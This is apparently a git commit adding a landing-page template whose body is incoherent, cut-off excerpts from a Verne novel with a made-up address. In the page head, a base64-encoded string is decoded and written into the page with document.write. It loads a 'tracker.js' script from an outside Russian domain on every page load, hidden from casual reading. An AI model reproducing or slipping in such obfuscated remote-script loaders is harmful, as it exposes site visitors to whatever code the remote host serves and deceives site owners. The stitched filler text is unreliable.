145d2d374242dd8499d0531cd1add19c53adc0f8
zwrudsch <76918869+zwrudsch@users.noreply.github.com>
2021-01-03 21:47:21 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>I passed the evening reading, writing, and thinking. Then sleep ove</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9lbGI2ZjNldzN6eXUiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>I passed the evening reading, writing, and thinking. Then sleep ove</h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">Besides, Captain Farragut had spoken of a certain s</h3>
+		<p>Why? I left him in the dying man's cabin, and returned to my room, much affected by this scene. During the whole day, I was haunted by uncomfortable suspicions, and at night I slept badly, and, between my broken dreams, I fancied I heard distant sighs like the notes of a funeral psalm. Were they the prayers of the dead, murmured in that language that I could not understand? I entered the captain's room; it had a severe, almost a monkish, aspect. A small iron bedstead, a table, some articles for the toilet; the whole lighted by a skylight. No comforts, the strictest necessaries only. The Canadian turned quickly at the last words.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">Oh! It will be nothing; not quite so direc</h3>
+		<p>That worthy fellow persisted in seeing in the commander of the Nautilus one of those unknown savants who return mankind contempt for indifference. For him, he was a misunderstood genius, who, tired of earth's deceptions, had taken refuge in this inaccessible medium, where he might follow his instincts freely. To my mind, this hypothesis explained but one side of Captain Nemo's character. At this moment, professor, the Nautilus is stranded in five fathoms, and we have nothing to do but to start. And Conseil, reassured, returned to the study of the bank, which the Nautilus was skirting at a moderate speed. Yes; a copse of dead trees, without leaves, without sap, trees petrified by the action of the water, and here and there overtopped by gigantic pines. It was like a coal pit, still standing, holding by the roots to the broken soil, and whose branches, like fine black paper cuttings, showed distinctly on the watery ceiling. Picture to yourself a forest in the Hartz, hanging on to the sides of the mountain, but a forest swallowed up. The paths were encumbered with seaweed and fucus, between which groveled a whole world of crustacea. I went along, climbing the rocks, striding over extended trunks, breaking the sea bind-weed which hung from one tree to the other, and frightening the fishes, which flew from branch to branch. Pressing onward, I felt no fatigue. I followed my guide, who was never tired. What a spectacle! How can I express it? How paint the aspect of those woods and rocks in this medium-their under parts dark and wild, the upper colored with red tints, by that light which the reflecting powers of the waters doubled? We climbed rocks, which fell directly after with gigantic bounds, and the low growling of an avalanche. To right and left ran long, dark galleries, where sight was lost. Here opened vast glades which the hand of man seemed to have worked; and I sometimes asked myself if some inhabitant of these submarine regions would not suddenly appear to me.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">At a sign from him the anchor was dropped, but the chain scarce</h3>	
+		<p>Before I could rush forward to stop him, the Canadian had thrown him down, and held him by the throat. The steward was choking under the grip of his powerful hand. By calculation; given the size of the vessel, which you know, sir, and consequently the quantity of air it contains, knowing also how much each man expends at a breath, and comparing these results with the fact that the Nautilus is obliged to go to the surface every twenty-four hours. They are seals and morses. Perhaps this is the same which the Alector saw, said Conseil.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>80031 Agnes Spring, Apt. 262, 12792, New Bernie, Oregon, United States</p>
+	</footer>
+
+</body>
+
+</html>
